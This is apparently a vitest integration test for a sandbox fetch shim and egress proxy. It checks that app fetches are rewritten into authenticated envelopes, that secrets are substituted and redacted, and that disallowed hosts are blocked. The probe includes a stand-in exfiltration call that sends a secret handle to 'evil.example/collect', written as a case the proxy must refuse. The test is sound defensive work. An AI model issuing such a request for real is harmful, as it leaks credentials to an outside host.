import type { AppDocument, SecretsProvider } from "@vendoai/core";
import { expect, it } from "vitest";
import type { AppDataAccess } from "../app-data.js";
import { createAppsProxy } from "../proxy.js";
import { mintRunToken } from "../run-token.js";
import type { SandboxAdapter } from "../sandbox.js";
import { FETCH_SHIM_BOOT_PRELUDE, FETCH_SHIM_PATH, FETCH_SHIM_SOURCE } from "../scaffold/fetch-shim.js";

/**
 * ENG-290 M4 — the fetch shim on a REAL provider machine, composed with the
 * REAL proxy over the REAL public network.
 *
 * A dev laptop's proxy route is not reachable from a cloud sandbox, so the
 * lane splits the seam at its wire joint, the §4.5 envelope, and proves both
 * halves for real:
 *
 *   1. IN THE SANDBOX (real machine, real node, the exact shim bytes, the real
 *      boot prelude): a probe boots a stand-in proxy on loopback, then runs
 *      ordinary app-code fetches. The lane asserts external fetches became
 *      §4.5 envelopes authenticated by the run token and still carrying the
 *      opaque handle, internal fetches passed through untouched, and a refusal
 *      surfaced as an ordinary fetch error.
 *   2. ON THE HOST: the EXACT envelope the sandbox emitted replays through the
 *      REAL createAppsProxy (default fetch, default node:dns SSRF resolver)
 *      toward the real allowlisted echo host — substitution happens, and the
 *      reflected secret is redacted on the way back.
 *
 * Bounded: one machine, stopped in finally.
 */

const ALLOWED_HOST = "postman-echo.com";
const STUB_PROXY_PORT = 9099;
const RUN_TOKEN = "rt_live_shim_probe";
const HANDLE = "vendo-secret:ECHO_KEY:290a4cafe";
const REAL_SECRET = `sk_live_shim_${Math.random().toString(36).slice(2)}`;
const tokenSecret = new TextEncoder().encode("eng-290-m4-live-shim-secret-key-1");

const PROBE_SOURCE = `import http from "node:http";
import { writeFileSync } from "node:fs";

const recorded = [];
const stubProxy = http.createServer((request, response) => {
  const chunks = [];
  request.on("data", (chunk) => chunks.push(chunk));
  request.on("end", () => {
    const body = Buffer.concat(chunks).toString("utf8");
    recorded.push({ path: request.url, authorization: request.headers.authorization ?? null, body });
    let envelope = null;
    try { envelope = JSON.parse(body); } catch {}
    response.writeHead(envelope && envelope.url && envelope.url.includes("evil.example") ? 403 : 200, {
      "content-type": "application/json",
    });
    response.end(envelope && envelope.url && envelope.url.includes("evil.example")
      ? JSON.stringify({ error: { code: "egress-blocked", message: "host is not in the app egress allowlist" } })
      : JSON.stringify({ status: 200, headers: { "x-proxied": "yes" }, body: "proxied-ok" }));
  });
});
await new Promise((resolve) => stubProxy.listen(${STUB_PROXY_PORT}, "127.0.0.1", resolve));

const port = Number(process.env.PORT || "8080");
const internalApp = http.createServer((request, response) => {
  response.writeHead(200, { "content-type": "text/plain" });
  response.end("internal-ok");
});
await new Promise((resolve) => internalApp.listen(port, "127.0.0.1", resolve));

const result = {};
const external = await fetch("https://${ALLOWED_HOST}/post", {
  method: "POST",
  headers: { authorization: "Bearer " + process.env.ECHO_KEY },
  body: "hello-from-sandbox",
});
result.external = { status: external.status, proxied: external.headers.get("x-proxied"), body: await external.text() };
const internal = await fetch("http://127.0.0.1:" + port + "/");
result.internal = await internal.text();
try {
  await fetch("https://evil.example/collect", { headers: { authorization: "Bearer " + process.env.ECHO_KEY } });
  result.blocked = "NOT-THROWN";
} catch (error) {
  result.blocked = String((error && error.message) || error);
}
result.recorded = recorded;
writeFileSync("/tmp/vendo-shim-probe.json", JSON.stringify(result));
stubProxy.close();
internalApp.close();
`;

interface ProbeResult {
  external: { status: number; proxied: string | null; body: string };
  internal: string;
  blocked: string;
  recorded: Array<{ path: string; authorization: string | null; body: string }>;
}

/** Env-gated live lane shared by the E2B and Modal providers. */
export const fetchShimLiveLane = (
  name: string,
  makeAdapter: () => SandboxAdapter | Promise<SandboxAdapter>,
): void => {
  it(`${name}: the shim rewrites app fetches into authenticated §4.5 envelopes, replayed through the real proxy`, async () => {
    const adapter = await makeAdapter();
    const machine = await adapter.create({
      env: {
        PORT: "8080",
        VENDO_PROXY_URL: `http://127.0.0.1:${STUB_PROXY_PORT}`,
        VENDO_RUN_TOKEN: RUN_TOKEN,
        ECHO_KEY: HANDLE,
      },
      files: {
        [FETCH_SHIM_PATH]: FETCH_SHIM_SOURCE,
        "/app/shim-probe.mjs": PROBE_SOURCE,
      },
      egress: [ALLOWED_HOST],
    });
    let probe: ProbeResult;
    try {
      // The REAL boot prelude loads the shim exactly the way app servers boot.
      const run = await machine.exec(
        `${FETCH_SHIM_BOOT_PRELUDE}\nnode /app/shim-probe.mjs`,
        { cwd: "/app", timeoutMs: 60_000 },
      );
      expect(run.code, run.stderr || run.stdout).toBe(0);
      probe = JSON.parse(new TextDecoder().decode(await machine.files.read("/tmp/vendo-shim-probe.json"))) as ProbeResult;
    } finally {
      await machine.stop().catch(() => undefined);
    }

    // In-sandbox half: the external fetch was rewritten to the proxy...
    expect(probe.external).toEqual({ status: 200, proxied: "yes", body: "proxied-ok" });
    // ...the internal fetch passed through untouched (never reached the stub)...
    expect(probe.internal).toBe("internal-ok");
    // ...and the refusal surfaced as an ordinary fetch error naming the code.
    expect(probe.blocked).toContain("egress-blocked");

    // Exactly two envelopes reached /egress (external + blocked), each
    // authenticated by the run token and carrying the opaque handle.
    expect(probe.recorded).toHaveLength(2);
    for (const record of probe.recorded) {
      expect(record.path).toBe("/egress");
      expect(record.authorization).toBe(`Bearer ${RUN_TOKEN}`);
    }
    const envelope = JSON.parse(probe.recorded[0]?.body ?? "{}") as {
      url: string; method?: string; headers?: Record<string, string>; body?: string;
    };
    expect(envelope.url).toBe(`https://${ALLOWED_HOST}/post`);
    expect(envelope.method).toBe("POST");
    expect(envelope.headers?.authorization).toBe(`Bearer ${HANDLE}`);
    expect(envelope.body).toBe("hello-from-sandbox");

    // Host half: replay the EXACT envelope the sandbox emitted through the
    // REAL proxy (default fetch + node:dns) toward the real echo host.
    const app = {
      format: "vendo/app@1",
      id: "app_live_shim",
      name: "Live shim app",
      egress: [ALLOWED_HOST],
      secrets: ["ECHO_KEY"],
    } as AppDocument;
    const secrets: SecretsProvider = { async get(name) { return name === "ECHO_KEY" ? REAL_SECRET : undefined; } };
    const proxy = createAppsProxy({
      tokenSecret,
      tools: { async descriptors() { return []; }, async execute() { return { status: "blocked", reason: "n/a" }; } },
      data: {} as AppDataAccess,
      owns: async () => true,
      loadApp: async () => app,
      secrets,
    });
    const replayToken = await mintRunToken(tokenSecret, {
      appId: app.id, subject: "user_live", runId: "run_live_shim", presence: "present",
      expiresAt: Date.now() + 120_000, jti: "jti_live_shim",
    });
    const replayed = await proxy.handler(new Request("https://proxy.test/egress", {
      method: "POST",
      headers: { authorization: `Bearer ${replayToken}`, "content-type": "application/json" },
      body: probe.recorded[0]?.body ?? "",
    }));
    expect(replayed.status).toBe(200);
    const relayed = await replayed.json() as { status: number; body: string };
    expect(relayed.status).toBe(200);
    // Reflect-then-redact: the echo saw the REAL value (substitution happened),
    // and the proxy stripped it before it would return to app code.
    expect(relayed.body).toContain("[vendo-secret-redacted]");
    expect(relayed.body).not.toContain(HANDLE);
    expect(relayed.body).not.toContain(REAL_SECRET);
  }, 180_000);
};
